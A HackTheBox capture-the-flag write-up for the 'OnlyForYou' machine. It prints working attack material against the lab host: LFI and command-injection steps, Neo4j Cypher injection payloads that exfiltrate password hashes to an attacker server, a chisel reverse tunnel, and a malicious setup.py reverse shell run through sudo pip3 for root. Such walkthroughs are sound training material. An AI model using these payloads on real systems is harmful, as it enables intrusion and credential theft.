# [OnlyForYou](https://app.hackthebox.com/machines/OnlyForYou) - 21/08/2023 - HackTheBox write-up

## User flag

### Discovery

With a `nmap` we can found an HTTP and a SSH server. After some enumeration we didn't find anything interesting, so I ran a `gobuster` virtual host enumeration with the following command:
```bash
$ gobuster vhost --append-domain -u only4you.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

And I found : `beta.only4you.htb`. This app allows us to download the source code of the app, written in Python (`Flask`). It offers two services, resize (`/resize`) and convert (`/convert`) our images, and accept PNG and JPEG format. After resizing an image we can download it as any size (100x100, 200x200...) at `/download`.

### Search for vulnerability

By inspecting the source code we can found a vulnerability in the app. To download our resized image we need to specify the file we want to download in a POST parameter. For example:
```
POST /download HTTP/1.1
Host: beta.only4you.htb

image=300x300.png
```

And the app check for possible LFI with the following condition :
```python
if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
```

So, a file starting with `/` will not raise an error for the app. With this we can read any file if we know his absolute path (for example `/etc/passwd`).

### Exploitation

Then I've searched in the configuration and log files to find informations, and I found the name of the web apps directories : `/var/www/only4you.htb/` and `/var/www/beta.only4you.htb/`. We cannot read the `config.py` file but under `only4you.htb/` I found a `form.py` which is used to send emails and run system commands to check for a domain name.

In this `form.py` the app run a `dig` command and take as a parameter the name of the domain given by the user in the email address. To check if the email is correct it uses regular expression :
```python
if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
    return 0
```

But the regex didn't contain the `^` and `$` symbol, so we can inject code at the end of the address, which will be executed then :
```python
else:
    domain = email.split("@", 1)[1]
    result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

I didn't succeed to create a reverse shell, but I can use the `curl` command and send output of subcommands base64 encoded and then send it to my Python HTTP server. I wrote a little handler to automatically decode the request and show the command output to make things easily.

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import base64

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        if query['cmd']:
            print(f"Received command:")
            print(base64.b64decode(query['cmd'][0]).decode())

httpd = HTTPServer(('', <PORT>), MyHandler)
httpd.serve_forever()
```

After a break I came back and retry a Python reverse shell (I don't know why it didn't work the first time), so it will be easier for the next.

### Discovery

I'm now connected on the server as `www-data` user and we can see in `/home` two users: `dev` and `john`. So we need first to found a way to connect as one of these users.

### Search for vulnerability

First, we can search in configuration file and run a `linpeas.sh` to find any vulnerability to exploit. After some researches I didn't find anything. Then, I think about the network and we can find 3 services that run on the server only for local users :
```bash
$ ss -atlp
State    Recv-Q   Send-Q          Local Address:Port        Peer Address:Port   Process
[...]
LISTEN   0        4096                127.0.0.1:3000             0.0.0.0:*
LISTEN   0        2048                127.0.0.1:8001             0.0.0.0:*
LISTEN   0        4096       [::ffff:127.0.0.1]:7687                   *:*
LISTEN   0        50         [::ffff:127.0.0.1]:7474                   *:* 
[...]
```

We want to access these services from our machine, so we need to create a tunnel. For that we can use `chisel`, it will create a tunnel using HTTP Web sockets and SSH tunnels.

We run the `chisel` server on our machine (attack box) with the following command:
```bash
./chisel server --reverse --port 51234  # any opened port
```

And then we run the client on the target:
```bash
# You can forward any number of ports to the server machine
./chisel client <ATTACK-IP>:51234 R:8001:127.0.0.1:8001 [R:<PORT>:127.0.01:<PORT>]*
                                  |
                                  |- [attack-ip:attack-port:target-ip:target-port]
                                  `- R is an alias for 127.0.0.1
# So here, we forward the 4 previous ports (3000, 8001, 7687, 7474)
```

We can now access all of these services from our attack box. The corresponding services are:
    - 3000: `Gogs` (Go Git Services)
    - 8001: An intern app with data and employees informations
    - 7474: A `neo4j-browser` application
    - 7687: The `neo4j` database

In the `Gogs` app we can find two users, `john` and `administrator`, but among all these services we can only connect easily to the internal app with the credentials `admin:admin`. There is a dashboard, a user profile and we can search for employees in the third page.

A message in the dashboard said that the migration to `neo4j` database is done. Moreover, if we try to search for a user with name containing `'`, we get a 500 error. So, it might be a Neo4j Cypher Injection ([link](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)).

### Exploitation

First we need to check if the `search` allow us to perform Neo4j Cypher Injection. So we first need to launch a Python HTTP server and then we can do the following request:
```
POST /search HTTP/1.1
Host: 127.0.0.1:8001
[...]

search=' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://<ATTACK-IP>:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

We receive the following :
```bash
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.210 - - [23/Aug/2023 10:55:23] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
10.10.11.210 - - [23/Aug/2023 10:55:23] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
```

It works ! The we can extract the labels in the database:
```
# Search payload to send
search=' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.68:8000/?label=' + label as l RETURN 0 as _0 //
# We receive
10.10.11.210 - - [23/Aug/2023 10:56:52] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [23/Aug/2023 10:56:52] "GET /?label=employee HTTP/1.1" 200 -
[...]
```

Finally we can read the keys of the found properties:
```
# Send
search=' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.68:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
# And receive
10.10.11.210 - - [23/Aug/2023 11:00:04] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [23/Aug/2023 11:00:04] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [23/Aug/2023 11:00:04] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [23/Aug/2023 11:00:05] "GET /?username=john HTTP/1.1" 200 -
[...]
```

The last step is to crack these passwords, we already know the `admin` one, and on `crackstation.net` we can recover John's password : `ThisIs4You`. We can now use it to connect to the SSH server as `john` and get the flag !

## Root flag

### Search for vulnerability

After all this steps, I think that the root flag will as hard as the user, but after running `linpeas` and a bit of researches, I've found this in `sudo -l`:
```bash
User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http://127.0.0.1:3000/*.tar.gz
```

So, `john` can download a packet with `pip` from the local Gogs server. But the `*` is a misconfiguration in `sudo` config because we can replace it by anything, including:
```bash
# We replace by a path to a writable directory
$ /usr/bin/pip3 download http://127.0.0.1:3000/../../../../../../tmp/package.tar.gz
```

### Exploitation

And also, we need to know that `pip` will run the Python script `package/setup.py` in the downloaded archive. So we can craft the exploit with the following commands:
```bash
$ cd /tmp
/tmp $ mkdir package
/tmp $ cd package
/tmp/package $ vim setup.py
```

Write a Python reverse shell:
```python
import socket,os,pty
s=socket.socket()
s.connect(("<IP>","<PORT>"))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

And finally:
```bash
/tmp/package $ cd ..
/tmp $ tar -czf package.tar.gz package/
```

Now, we can launch a `netcat` from the attack box and run the exploit:
```bash
$ /usr/bin/pip3 download http://127.0.0.1:3000/../../../../../../tmp/package.tar.gz
```

It will extract the archive, run `setup.py` and we have a root shell !
